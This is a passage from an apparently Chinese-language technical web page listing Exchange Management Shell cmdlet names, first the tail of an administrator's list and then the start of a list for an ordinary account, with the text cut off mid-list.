class="hljs-built_in">Remove-ActiveSyncVirtualDirectory</span><br><span class="hljs-built_in">Remove-AddressBookPolicy</span><br><span class="hljs-built_in">Remove-AddressList</span><br><span class="hljs-built_in">Remove-ADPermission</span><br><span class="hljs-built_in">Remove-App</span><br><span class="hljs-built_in">Remove-AuditStubFolder</span><br><span class="hljs-built_in">Remove-AuthRedirect</span><br><span class="hljs-built_in">Remove-AuthServer</span><br><span class="hljs-built_in">Remove-AutodiscoverVirtualDirectory</span><br><span class="hljs-built_in">Remove-AvailabilityAddressSpace</span><br><span class="hljs-built_in">Remove-ClassificationRuleCollection</span><br><span class="hljs-built_in">Remove-CompliancePolicySyncNotification</span><br><span class="hljs-built_in">Remove-ComplianceServiceVirtualDirectory</span><br><span class="hljs-built_in">Remove-ContentFilterPhrase</span><br><span class="hljs-built_in">Remove-DatabaseAvailabilityGroup</span><br><span class="hljs-built_in">Remove-DatabaseAvailabilityGroupConfiguration</span><br><span class="hljs-built_in">Remove-DatabaseAvailabilityGroupNetwork</span><br><span class="hljs-built_in">Remove-DatabaseAvailabilityGroupServer</span><br><span class="hljs-built_in">Remove-DataClassification</span><br><span class="hljs-built_in">Remove-DeliveryAgentConnector</span><br><span class="hljs-built_in">Remove-DistributionGroup</span><br><span class="hljs-built_in">Remove-DistributionGroupMember</span><br><span class="hljs-built_in">Remove-DlpPolicy</span><br><span class="hljs-built_in">Remove-DlpPolicyTemplate</span><br><span class="hljs-built_in">Remove-DynamicDistributionGroup</span><br><span class="hljs-built_in">Remove-EcpVirtualDirectory</span><br><span class="hljs-built_in">Remove-EdgeSubscription</span><br><span class="hljs-built_in">Remove-EmailAddressPolicy</span><br><span class="hljs-built_in">Remove-ExchangeCertificate</span><br><span class="hljs-built_in">Remove-FederatedDomain</span><br><span class="hljs-built_in">Remove-FederationTrust</span><br><span class="hljs-built_in">Remove-ForeignConnector</span><br><span class="hljs-built_in">Remove-GlobalAddressList</span><br><span class="hljs-built_in">Remove-GlobalMonitoringOverride</span><br><span class="hljs-built_in">Remove-HybridConfiguration</span><br><span class="hljs-built_in">Remove-InboxRule</span><br><span class="hljs-built_in">Remove-IntraOrganizationConnector</span><br><span class="hljs-built_in">Remove-IPAllowListEntry</span><br><span class="hljs-built_in">Remove-IPAllowListProvider</span><br><span class="hljs-built_in">Remove-IPBlockListEntry</span><br><span class="hljs-built_in">Remove-IPBlockListProvider</span><br><span class="hljs-built_in">Remove-JournalRule</span><br><span class="hljs-built_in">Remove-Mailbox</span><br><span class="hljs-built_in">Remove-MailboxDatabase</span><br><span class="hljs-built_in">Remove-MailboxDatabaseCopy</span><br><span class="hljs-built_in">Remove-MailboxDeliveryVirtualDirectory</span><br><span class="hljs-built_in">Remove-MailboxFolderPermission</span><br><span class="hljs-built_in">Remove-MailboxLocation</span><br><span class="hljs-built_in">Remove-MailboxPermission</span><br><span class="hljs-built_in">Remove-MailboxRepairRequest</span><br><span class="hljs-built_in">Remove-MailboxRestoreRequest</span><br><span class="hljs-built_in">Remove-MailboxSearch</span><br><span class="hljs-built_in">Remove-MailboxUserConfiguration</span><br><span class="hljs-built_in">Remove-MailContact</span><br><span class="hljs-built_in">Remove-MailUser</span><br><span class="hljs-built_in">Remove-MalwareFilterPolicy</span><br><span class="hljs-built_in">Remove-MalwareFilterRule</span><br><span class="hljs-built_in">Remove-ManagementRole</span><br><span class="hljs-built_in">Remove-ManagementRoleAssignment</span><br><span class="hljs-built_in">Remove-ManagementRoleEntry</span><br><span class="hljs-built_in">Remove-ManagementScope</span><br><span class="hljs-built_in">Remove-MapiVirtualDirectory</span><br><span class="hljs-built_in">Remove-Message</span><br><span class="hljs-built_in">Remove-MessageClassification</span><br><span class="hljs-built_in">Remove-MigrationBatch</span><br><span class="hljs-built_in">Remove-MigrationEndpoint</span><br><span class="hljs-built_in">Remove-MigrationUser</span><br><span class="hljs-built_in">Remove-MobileDevice</span><br><span class="hljs-built_in">Remove-MobileDeviceMailboxPolicy</span><br><span class="hljs-built_in">Remove-MoveRequest</span><br><span class="hljs-built_in">Remove-MRSRequest</span><br><span class="hljs-built_in">Remove-OabVirtualDirectory</span><br><span class="hljs-built_in">Remove-OfflineAddressBook</span><br><span class="hljs-built_in">Remove-OrganizationRelationship</span><br><span class="hljs-built_in">Remove-OutlookProtectionRule</span><br><span class="hljs-built_in">Remove-OutlookProvider</span><br><span class="hljs-built_in">Remove-OutlookServiceVirtualDirectory</span><br><span class="hljs-built_in">Remove-OwaMailboxPolicy</span><br><span class="hljs-built_in">Remove-OwaVirtualDirectory</span><br><span class="hljs-built_in">Remove-PartnerApplication</span><br><span class="hljs-built_in">Remove-PolicyTipConfig</span><br><span class="hljs-built_in">Remove-PowerShellVirtualDirectory</span><br><span class="hljs-built_in">Remove-PublicFolder</span><br><span class="hljs-built_in">Remove-PublicFolderClientPermission</span><br><span class="hljs-built_in">Remove-PublicFolderMailboxMigrationRequest</span><br><span class="hljs-built_in">Remove-PublicFolderMigrationRequest</span><br><span class="hljs-built_in">Remove-PublicFolderMoveRequest</span><br><span class="hljs-built_in">Remove-PushNotificationSubscription</span><br><span class="hljs-built_in">Remove-ReceiveConnector</span><br><span class="hljs-built_in">Remove-RemoteDomain</span><br><span class="hljs-built_in">Remove-RemoteMailbox</span><br><span class="hljs-built_in">Remove-RestVirtualDirectory</span><br><span class="hljs-built_in">Remove-ResubmitRequest</span><br><span class="hljs-built_in">Remove-RetentionPolicy</span><br><span class="hljs-built_in">Remove-RetentionPolicyTag</span><br><span class="hljs-built_in">Remove-RoleAssignmentPolicy</span><br><span class="hljs-built_in">Remove-RoleGroup</span><br><span class="hljs-built_in">Remove-RoleGroupMember</span><br><span class="hljs-built_in">Remove-SearchDocumentFormat</span><br><span class="hljs-built_in">Remove-SendConnector</span><br><span class="hljs-built_in">Remove-ServerMonitoringOverride</span><br><span class="hljs-built_in">Remove-SettingOverride</span><br><span class="hljs-built_in">Remove-SharingPolicy</span><br><span class="hljs-built_in">Remove-SiteMailboxProvisioningPolicy</span><br><span class="hljs-built_in">Remove-StoreMailbox</span><br><span class="hljs-built_in">Remove-SweepRule</span><br><span class="hljs-built_in">Remove-SyncMailPublicFolder</span><br><span class="hljs-built_in">Remove-SystemMessage</span><br><span class="hljs-built_in">Remove-ThrottlingPolicy</span><br><span class="hljs-built_in">Remove-TransportRule</span><br><span class="hljs-built_in">Remove-UMAutoAttendant</span><br><span class="hljs-built_in">Remove-UMCallAnsweringRule</span><br><span class="hljs-built_in">Remove-UMDialPlan</span><br><span class="hljs-built_in">Remove-UMHuntGroup</span><br><span class="hljs-built_in">Remove-UMIPGateway</span><br><span class="hljs-built_in">Remove-UMMailboxPolicy</span><br><span class="hljs-built_in">Remove-UserPhoto</span><br><span class="hljs-built_in">Remove-WebServicesVirtualDirectory</span><br><span class="hljs-built_in">Remove-X400AuthoritativeDomain</span><br><span class="hljs-built_in">Reset-ProvisioningCache</span><br><span class="hljs-built_in">Restore-DatabaseAvailabilityGroup</span><br><span class="hljs-built_in">Restore-DetailsTemplate</span><br><span class="hljs-built_in">Resume-MailboxDatabaseCopy</span><br><span class="hljs-built_in">Resume-MailboxExportRequest</span><br><span class="hljs-built_in">Resume-MailboxRestoreRequest</span><br><span class="hljs-built_in">Resume-Message</span><br><span class="hljs-built_in">Resume-MoveRequest</span><br><span class="hljs-built_in">Resume-MRSRequest</span><br><span class="hljs-built_in">Resume-PublicFolderMailboxMigrationRequest</span><br><span class="hljs-built_in">Resume-PublicFolderMigrationRequest</span><br><span class="hljs-built_in">Resume-PublicFolderMoveRequest</span><br><span class="hljs-built_in">Resume-Queue</span><br>Retry<span class="hljs-literal">-Queue</span><br><span class="hljs-built_in">Search-AdminAuditLog</span><br><span class="hljs-built_in">Search-MailboxAuditLog</span><br><span class="hljs-built_in">Search-MessageTrackingReport</span><br><span class="hljs-built_in">Send-TextMessagingVerificationCode</span><br><span class="hljs-built_in">Set-AcceptedDomain</span><br><span class="hljs-built_in">Set-ActiveSyncDeviceAccessRule</span><br><span class="hljs-built_in">Set-ActiveSyncDeviceAutoblockThreshold</span><br><span class="hljs-built_in">Set-ActiveSyncMailboxPolicy</span><br><span class="hljs-built_in">Set-ActiveSyncOrganizationSettings</span><br><span class="hljs-built_in">Set-ActiveSyncVirtualDirectory</span><br><span class="hljs-built_in">Set-AddressBookPolicy</span><br><span class="hljs-built_in">Set-AddressList</span><br><span class="hljs-built_in">Set-AdminAuditLogConfig</span><br><span class="hljs-built_in">Set-ADServerSettings</span><br><span class="hljs-built_in">Set-ADSite</span><br><span class="hljs-built_in">Set-AdSiteLink</span><br><span class="hljs-built_in">Set-App</span><br><span class="hljs-built_in">Set-AuthConfig</span><br><span class="hljs-built_in">Set-AuthRedirect</span><br><span class="hljs-built_in">Set-AuthServer</span><br><span class="hljs-built_in">Set-AutodiscoverVirtualDirectory</span><br><span class="hljs-built_in">Set-AvailabilityConfig</span><br><span class="hljs-built_in">Set-CalendarNotification</span><br><span class="hljs-built_in">Set-CalendarProcessing</span><br><span class="hljs-built_in">Set-CASMailbox</span><br><span class="hljs-built_in">Set-ClassificationRuleCollection</span><br><span class="hljs-built_in">Set-ClientAccessServer</span><br><span class="hljs-built_in">Set-ClientAccessService</span><br><span class="hljs-built_in">Set-CmdletExtensionAgent</span><br><span class="hljs-built_in">Set-CompliancePolicySyncTenantInfo</span><br><span class="hljs-built_in">Set-ComplianceServiceVirtualDirectory</span><br><span class="hljs-built_in">Set-ConsumerGroup</span><br><span class="hljs-built_in">Set-ConsumerMailbox</span><br><span class="hljs-built_in">Set-Contact</span><br><span class="hljs-built_in">Set-ContentFilterConfig</span><br><span class="hljs-built_in">Set-DatabaseAvailabilityGroup</span><br><span class="hljs-built_in">Set-DatabaseAvailabilityGroupConfiguration</span><br><span class="hljs-built_in">Set-DatabaseAvailabilityGroupNetwork</span><br><span class="hljs-built_in">Set-DataClassification</span><br><span class="hljs-built_in">Set-DeliveryAgentConnector</span><br><span class="hljs-built_in">Set-DetailsTemplate</span><br><span class="hljs-built_in">Set-DistributionGroup</span><br><span class="hljs-built_in">Set-DlpPolicy</span><br><span class="hljs-built_in">Set-DynamicDistributionGroup</span><br><span class="hljs-built_in">Set-EcpVirtualDirectory</span><br><span class="hljs-built_in">Set-EdgeSyncServiceConfig</span><br><span class="hljs-built_in">Set-EmailAddressPolicy</span><br><span class="hljs-built_in">Set-EventLogLevel</span><br><span class="hljs-built_in">Set-ExchangeAssistanceConfig</span><br><span class="hljs-built_in">Set-ExchangeServer</span><br><span class="hljs-built_in">Set-FederatedOrganizationIdentifier</span><br><span class="hljs-built_in">Set-FederationTrust</span><br><span class="hljs-built_in">Set-ForeignConnector</span><br><span class="hljs-built_in">Set-FrontendTransportService</span><br><span class="hljs-built_in">Set-GlobalAddressList</span><br><span class="hljs-built_in">Set-Group</span><br><span class="hljs-built_in">Set-HybridConfiguration</span><br><span class="hljs-built_in">Set-ImapSettings</span><br><span class="hljs-built_in">Set-InboxRule</span><br><span class="hljs-built_in">Set-IntraOrganizationConnector</span><br><span class="hljs-built_in">Set-IPAllowListConfig</span><br><span class="hljs-built_in">Set-IPAllowListProvider</span><br><span class="hljs-built_in">Set-IPAllowListProvidersConfig</span><br><span class="hljs-built_in">Set-IPBlockListConfig</span><br><span class="hljs-built_in">Set-IPBlockListProvider</span><br><span class="hljs-built_in">Set-IPBlockListProvidersConfig</span><br><span class="hljs-built_in">Set-IRMConfiguration</span><br><span class="hljs-built_in">Set-JournalRule</span><br><span class="hljs-built_in">Set-LogExportVirtualDirectory</span><br><span class="hljs-built_in">Set-Mailbox</span><br><span class="hljs-built_in">Set-MailboxAuditBypassAssociation</span><br><span class="hljs-built_in">Set-MailboxAutoReplyConfiguration</span><br><span class="hljs-built_in">Set-MailboxCalendarConfiguration</span><br><span class="hljs-built_in">Set-MailboxCalendarFolder</span><br><span class="hljs-built_in">Set-MailboxDatabase</span><br><span class="hljs-built_in">Set-MailboxDatabaseCopy</span><br><span class="hljs-built_in">Set-MailboxDeliveryVirtualDirectory</span><br><span class="hljs-built_in">Set-MailboxFolderPermission</span><br><span class="hljs-built_in">Set-MailboxJunkEmailConfiguration</span><br><span class="hljs-built_in">Set-MailboxLocation</span><br><span class="hljs-built_in">Set-MailboxMessageConfiguration</span><br><span class="hljs-built_in">Set-MailboxRegionalConfiguration</span><br><span class="hljs-built_in">Set-MailboxRelocationRequest</span><br><span class="hljs-built_in">Set-MailboxRestoreRequest</span><br><span class="hljs-built_in">Set-MailboxSearch</span><br><span class="hljs-built_in">Set-MailboxServer</span><br><span class="hljs-built_in">Set-MailboxSpellingConfiguration</span><br><span class="hljs-built_in">Set-MailboxTransportService</span><br><span class="hljs-built_in">Set-MailContact</span><br><span class="hljs-built_in">Set-MailPublicFolder</span><br><span class="hljs-built_in">Set-MailUser</span><br><span class="hljs-built_in">Set-MalwareFilteringServer</span><br><span class="hljs-built_in">Set-MalwareFilterPolicy</span><br><span class="hljs-built_in">Set-MalwareFilterRule</span><br><span class="hljs-built_in">Set-ManagementRoleAssignment</span><br><span class="hljs-built_in">Set-ManagementRoleEntry</span><br><span class="hljs-built_in">Set-ManagementScope</span><br><span class="hljs-built_in">Set-MapiVirtualDirectory</span><br><span class="hljs-built_in">Set-MessageClassification</span><br><span class="hljs-built_in">Set-MigrationBatch</span><br><span class="hljs-built_in">Set-MigrationConfig</span><br><span class="hljs-built_in">Set-MigrationEndpoint</span><br><span class="hljs-built_in">Set-MobileDeviceMailboxPolicy</span><br><span class="hljs-built_in">Set-MoveRequest</span><br><span class="hljs-built_in">Set-Notification</span><br><span class="hljs-built_in">Set-OabVirtualDirectory</span><br><span class="hljs-built_in">Set-OfflineAddressBook</span><br><span class="hljs-built_in">Set-Organization</span><br><span class="hljs-built_in">Set-OrganizationConfig</span><br><span class="hljs-built_in">Set-OrganizationRelationship</span><br><span class="hljs-built_in">Set-OutlookAnywhere</span><br><span class="hljs-built_in">Set-OutlookProtectionRule</span><br><span class="hljs-built_in">Set-OutlookProvider</span><br><span class="hljs-built_in">Set-OutlookServiceVirtualDirectory</span><br><span class="hljs-built_in">Set-OwaMailboxPolicy</span><br><span class="hljs-built_in">Set-OwaVirtualDirectory</span><br><span class="hljs-built_in">Set-PartnerApplication</span><br><span class="hljs-built_in">Set-PendingFederatedDomain</span><br><span class="hljs-built_in">Set-PolicyTipConfig</span><br><span class="hljs-built_in">Set-PopSettings</span><br><span class="hljs-built_in">Set-PowerShellVirtualDirectory</span><br><span class="hljs-built_in">Set-ProtectionServicePolicy</span><br><span class="hljs-built_in">Set-PublicFolder</span><br><span class="hljs-built_in">Set-PublicFolderMailboxMigrationRequest</span><br><span class="hljs-built_in">Set-PublicFolderMigrationRequest</span><br><span class="hljs-built_in">Set-PublicFolderMoveRequest</span><br><span class="hljs-built_in">Set-ReceiveConnector</span><br><span class="hljs-built_in">Set-RecipientFilterConfig</span><br><span class="hljs-built_in">Set-RemoteDomain</span><br><span class="hljs-built_in">Set-RemoteMailbox</span><br><span class="hljs-built_in">Set-ResourceConfig</span><br><span class="hljs-built_in">Set-RestVirtualDirectory</span><br><span class="hljs-built_in">Set-ResubmitRequest</span><br><span class="hljs-built_in">Set-RetentionPolicy</span><br><span class="hljs-built_in">Set-RetentionPolicyTag</span><br><span class="hljs-built_in">Set-RoleAssignmentPolicy</span><br><span class="hljs-built_in">Set-RoleGroup</span><br><span class="hljs-built_in">Set-RpcClientAccess</span><br><span class="hljs-built_in">Set-SearchDocumentFormat</span><br><span class="hljs-built_in">Set-SendConnector</span><br><span class="hljs-built_in">Set-SenderFilterConfig</span><br><span class="hljs-built_in">Set-SenderIdConfig</span><br><span class="hljs-built_in">Set-SenderReputationConfig</span><br><span class="hljs-built_in">Set-ServerComponentState</span><br><span class="hljs-built_in">Set-ServerMonitor</span><br><span class="hljs-built_in">Set-SettingOverride</span><br><span class="hljs-built_in">Set-SharingPolicy</span><br><span class="hljs-built_in">Set-SiteMailbox</span><br><span class="hljs-built_in">Set-SiteMailboxProvisioningPolicy</span><br><span class="hljs-built_in">Set-SmimeConfig</span><br><span class="hljs-built_in">Set-SubmissionMalwareFilteringServer</span><br><span class="hljs-built_in">Set-SweepRule</span><br><span class="hljs-built_in">Set-SystemMessage</span><br><span class="hljs-built_in">Set-TextMessagingAccount</span><br><span class="hljs-built_in">Set-ThrottlingPolicy</span><br><span class="hljs-built_in">Set-ThrottlingPolicyAssociation</span><br><span class="hljs-built_in">Set-TransportAgent</span><br><span class="hljs-built_in">Set-TransportConfig</span><br><span class="hljs-built_in">Set-TransportRule</span><br><span class="hljs-built_in">Set-TransportServer</span><br><span class="hljs-built_in">Set-TransportService</span><br><span class="hljs-built_in">Set-UMAutoAttendant</span><br><span class="hljs-built_in">Set-UMCallAnsweringRule</span><br><span class="hljs-built_in">Set-UMCallRouterSettings</span><br><span class="hljs-built_in">Set-UMDialPlan</span><br><span class="hljs-built_in">Set-UMIPGateway</span><br><span class="hljs-built_in">Set-UMMailbox</span><br><span class="hljs-built_in">Set-UMMailboxConfiguration</span><br><span class="hljs-built_in">Set-UMMailboxPIN</span><br><span class="hljs-built_in">Set-UMMailboxPolicy</span><br><span class="hljs-built_in">Set-UMService</span><br><span class="hljs-built_in">Set-UnifiedAuditSetting</span><br><span class="hljs-built_in">Set-User</span><br><span class="hljs-built_in">Set-UserPhoto</span><br><span class="hljs-built_in">Set-WebServicesVirtualDirectory</span><br><span class="hljs-built_in">Set-X400AuthoritativeDomain</span><br><span class="hljs-built_in">Start-AuditAssistant</span><br><span class="hljs-built_in">Start-DatabaseAvailabilityGroup</span><br><span class="hljs-built_in">Start-EdgeSynchronization</span><br><span class="hljs-built_in">Start-ManagedFolderAssistant</span><br><span class="hljs-built_in">Start-MigrationBatch</span><br><span class="hljs-built_in">Start-UMPhoneSession</span><br><span class="hljs-built_in">Stop-DatabaseAvailabilityGroup</span><br><span class="hljs-built_in">Stop-ManagedFolderAssistant</span><br><span class="hljs-built_in">Stop-MigrationBatch</span><br><span class="hljs-built_in">Stop-UMPhoneSession</span><br><span class="hljs-built_in">Suspend-MailboxDatabaseCopy</span><br><span class="hljs-built_in">Suspend-MailboxRestoreRequest</span><br><span class="hljs-built_in">Suspend-Message</span><br><span class="hljs-built_in">Suspend-MoveRequest</span><br><span class="hljs-built_in">Suspend-MRSRequest</span><br><span class="hljs-built_in">Suspend-PublicFolderMailboxMigrationRequest</span><br><span class="hljs-built_in">Suspend-PublicFolderMigrationRequest</span><br><span class="hljs-built_in">Suspend-PublicFolderMoveRequest</span><br><span class="hljs-built_in">Suspend-Queue</span><br><span class="hljs-built_in">Test-ActiveSyncConnectivity</span><br><span class="hljs-built_in">Test-ArchiveConnectivity</span><br><span class="hljs-built_in">Test-AssistantHealth</span><br><span class="hljs-built_in">Test-CalendarConnectivity</span><br><span class="hljs-built_in">Test-DataClassification</span><br><span class="hljs-built_in">Test-EcpConnectivity</span><br><span class="hljs-built_in">Test-EdgeSynchronization</span><br><span class="hljs-built_in">Test-ExchangeSearch</span><br><span class="hljs-built_in">Test-FederationTrust</span><br><span class="hljs-built_in">Test-FederationTrustCertificate</span><br><span class="hljs-built_in">Test-ImapConnectivity</span><br><span class="hljs-built_in">Test-IPAllowListProvider</span><br><span class="hljs-built_in">Test-IPBlockListProvider</span><br><span class="hljs-built_in">Test-IRMConfiguration</span><br><span class="hljs-built_in">Test-Mailflow</span><br><span class="hljs-built_in">Test-MAPIConnectivity</span><br><span class="hljs-built_in">Test-MigrationServerAvailability</span><br><span class="hljs-built_in">Test-MLBHealth</span><br><span class="hljs-built_in">Test-MRSHealth</span><br><span class="hljs-built_in">Test-OAuthConnectivity</span><br><span class="hljs-built_in">Test-OrganizationRelationship</span><br><span class="hljs-built_in">Test-OutlookConnectivity</span><br><span class="hljs-built_in">Test-OutlookWebServices</span><br><span class="hljs-built_in">Test-PopConnectivity</span><br><span class="hljs-built_in">Test-PowerShellConnectivity</span><br><span class="hljs-built_in">Test-ReplicationHealth</span><br><span class="hljs-built_in">Test-SafeAndBlockedHashes</span><br><span class="hljs-built_in">Test-SenderId</span><br><span class="hljs-built_in">Test-ServiceHealth</span><br><span class="hljs-built_in">Test-SiteMailbox</span><br><span class="hljs-built_in">Test-SmtpConnectivity</span><br><span class="hljs-built_in">Test-TextExtraction</span><br><span class="hljs-built_in">Test-UMConnectivity</span><br><span class="hljs-built_in">Test-WebServicesConnectivity</span><br><span class="hljs-built_in">Uninstall-TransportAgent</span><br><span class="hljs-built_in">Update-AddressList</span><br><span class="hljs-built_in">Update-DatabaseSchema</span><br><span class="hljs-built_in">Update-DistributionGroupMember</span><br><span class="hljs-built_in">Update-EmailAddressPolicy</span><br><span class="hljs-built_in">Update-ExchangeHelp</span><br><span class="hljs-built_in">Update-GlobalAddressList</span><br><span class="hljs-built_in">Update-HybridConfiguration</span><br><span class="hljs-built_in">Update-MailboxDatabaseCopy</span><br><span class="hljs-built_in">Update-OfflineAddressBook</span><br><span class="hljs-built_in">Update-PublicFolderMailbox</span><br><span class="hljs-built_in">Update-Recipient</span><br><span class="hljs-built_in">Update-RoleGroupMember</span><br><span class="hljs-built_in">Update-SafeList</span><br><span class="hljs-built_in">Update-SiteMailbox</span><br><span class="hljs-built_in">Update-StoreMailboxState</span><br><span class="hljs-built_in">Write-AdminAuditLog</span><br><span class="hljs-built_in">Exit-PSSession</span><br><span class="hljs-built_in">Get-FormatData</span><br><span class="hljs-built_in">Measure-Object</span><br><span class="hljs-built_in">Out-Default</span><br><span class="hljs-built_in">Select-Object</span><br></code></pre></td></tr></table></figure>

<h2 id="2、普通账户"><a href="#2、普通账户" class="headerlink" title="2、普通账户"></a>2、普通账户</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Add-DistributionGroupMember</span><br><span class="hljs-built_in">Add-MailboxFolderPermission</span><br><span class="hljs-built_in">Clear-ActiveSyncDevice</span><br><span class="hljs-built_in">Clear-MobileDevice</span><br><span class="hljs-built_in">Clear-TextMessagingAccount</span><br><span class="hljs-built_in">Compare-TextMessagingVerificationCode</span><br><span class="hljs-built_in">Disable-App</span><br><span class="hljs-built_in">Disable-InboxRule</span><br><span class="hljs-built_in">Disable-SweepRule</span><br><span class="hljs-built_in">Disable-UMCallAnsweringRule</span><br><span class="hljs-built_in">Enable-App</span><br><span class="hljs-built_in">Enable-InboxRule</span><br><span class="hljs-built_in">Enable-SweepRule</span><br><span class="hljs-built_in">Enable-UMCallAnsweringRule</span><br><span class="hljs-built_in">Get-ActiveSyncDevice</span><br><span class="hljs-built_in">Get-ActiveSyncDeviceStatistics</span><br><span class="hljs-built_in">Get-App</span><br><span class="hljs-built_in">Get-CalendarNotification</span><br><span class="hljs-built_in">Get-CalendarProcessing</span><br><span class="hljs-built_in">Get-CASMailbox</span><br><span class="hljs-built_in">Get-Command</span><br><span class="hljs-built_in">Get-ConsumerGroup</span><br><span class="hljs-built_in">Get-ConsumerMailbox</span><br><span class="hljs-built_in">Get-DistributionGroup</span><br><span class="hljs-built_in">Get-DistributionGroupMember</span><br><span class="hljs-built_in">Get-EligibleDistributionGroupForMigration</span><br><span class="hljs-built_in">Get-Group</span><br><span class="hljs-built_in">Get-Help</span><br><span class="hljs-built_in">Get-InboxRule</span><br><span class="hljs-built_in">Get-Mailbox</span><br><span class="hljs-built_in">Get-MailboxAutoReplyConfiguration</span><br><span class="hljs-built_in">Get-MailboxCalendarConfiguration</span><br><span class="hljs-built_in">Get-MailboxCalendarFolder</span><br><span class="hljs-built_in">Get-MailboxFolder</span><br><span class="hljs-built_in">Get-MailboxFolderPermission</span><br><span class="hljs-built_in">Get-MailboxJunkEmailConfiguration</span><br><span class="hljs-built_in">Get-MailboxMessageConfiguration</span><br><span class="hljs-built_in">Get-MailboxPreferredLocation</span><br><span class="hljs-built_in">Get-MailboxRegionalConfiguration</span><br><span class="hljs-built_in">Get-MailboxSpellingConfiguration</span><br><span class="hljs-built_in">Get-MailboxStatistics</span><br><span class="hljs-built_in">Get-MailboxUserConfiguration</span><br><span class="hljs-built_in">Get-MessageCategory</span><br><span class="hljs-built_in">Get-MessageClassification</span><br><span class="hljs-built_in">Get-MessageTrackingReport</span><br><span class="hljs-built_in">Get-MobileDevice</span><br><span class="hljs-built_in">Get-MobileDeviceStatistics</span><br><span class="hljs-built_in">Get-OnlineMeetingConfiguration</span><br><span class="hljs-built_in">Get-RbacDiagnosticInfo</span><br><span class="hljs-built_in">Get-Recipient</span><br><span class="hljs-built_in">Get-SiteMailbox</span><br><span class="hljs-built_in">Get-SiteMailboxDiagnostics</span><br><span class="hljs-built_in">Get-SweepRule</span><br><span class="hljs-built_in">Get-TextMessagingAccount</span><br><span class="hljs-built_in">Get-UMCallAnsweringRule</span><br><span class="hljs-built_in">Get-UMMailbox</span><br><span class="hljs-built_in">Get-UMMailboxConfiguration</span><br><span class="hljs-built_in">Get-UMPhoneSession</span><br><span class="hljs-built_in">Get-UnifiedAuditSetting</span><br><span class="hljs-built_in">Get-User</span><br><span class="hljs-built_in">Get-UserPhoto</span><br><span class="hljs-built_in">Import-RecipientDataProperty</span><br><span class="hljs-built_in">New-App</span><br><span class="hljs-built_in">New-ConsumerGroup</span><br><span class="hljs-built_in">New-InboxRule</span><br><span class="hljs-built_in">New-MailboxFolder</span><br><span class="hljs-built_in">New-MailMessage</span><br><span class="hljs-built_in">New-SchedulingMailbox</span><br><span class="hljs-built_in">New-SiteMailbox</span><br><span class="hljs-built_in">New-SweepRule</span><br><span class="hljs-built_in">New-UMCallAnsweringRule</span><br><span class="hljs-built_in">Remove-ActiveSyncDevice</span><br><span class="hljs-built_in">Remove-App</span><br><span class="hljs-built_in">Remove-DistributionGroupMember</span><br><span class="hljs-built_in">Remove-InboxRule</span><br><span class="hljs-built_in">Remove-MailboxFolderPermission</span><br><span class="hljs-built_in">Remove-MailboxUserConfiguration</span><br><span class="hljs-built_in">Remove-MobileDevice</span><br><span class="hljs-built_in">Remove-SweepRule</span><br><span class="hljs-built_in">Remove-UMCallAnsweringRule</span><br><span class="hljs-built_in">Remove-UserPhoto</span><br><span class="hljs-built_in">Search-MessageTrackingReport</span><br><span class="hljs-built_in">Send-TextMessagingVerificationCode</span><br><span class="hljs-built_in">Set-CalendarNotification</span><br><span class="hljs-built_in">Set-CalendarProcessing</span><br><span class="hljs-built_in">Set-CASMailbox</span><br><span class="hljs-built_in">Set-ConsumerGroup</span><br><span class="hljs-built_in">Set-ConsumerMailbox</span><br><span class="hljs-built_in">Set-InboxRule</span><br><span class="hljs-built_in">Set-Mailbox</span><br><span class="hljs-built_in">Set-MailboxAutoReplyConfiguration</span><br><span class="hljs-built_in">Set-MailboxCalendarConfiguration</span><br><span class="hljs-built_in">Set-MailboxCalendarFolder</span><br><span class="hljs-built_in">Set-MailboxFolderPermission</span><br><span class="hljs-built_in">Set-MailboxJunkEmailConfiguration</span><br><span class="hljs-built_in">Set-MailboxMessageConfiguration</span><br><span class="hljs-built_in">Set-MailboxRegionalConfiguration</span><br><span 